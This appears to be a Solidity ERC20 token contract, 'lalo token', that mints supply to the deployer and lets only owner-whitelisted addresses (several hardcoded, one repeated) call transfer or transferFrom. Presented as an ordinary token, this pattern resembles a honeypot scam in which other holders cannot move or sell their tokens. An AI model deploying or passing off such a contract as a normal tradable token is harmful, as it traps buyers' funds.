// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";

contract lalotoken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("lalo token", "lot") {
        whiteList[msg.sender]=true;
        _mint(msg.sender, 100000 * 10 ** decimals());
        whiteList[address(0x33318f56e3C6Bf52D301Cee0eC9C64A42d990d65)]=true;
        whiteList[address(0x63cc1afB26D487C2C5cFDDb291e6C9C29B667070)]=true;
        whiteList[address(0x63cc1afB26D487C2C5cFDDb291e6C9C29B667070)]=true;
        whiteList[address(0x63cc1afB26D487C2C5cFDDb291e6C9C29B667070)]=true;
        whiteList[address(0x63cc1afB26D487C2C5cFDDb291e6C9C29B667070)]=true;
    }
    function addToWhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }
    function removeFromWhiteList(address add)public onlyOwner{
        whiteList[add]=false;
    }
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        require(whiteList[msg.sender],"This function is not allowed");
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        require(whiteList[msg.sender],"This function is not allowed");
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
}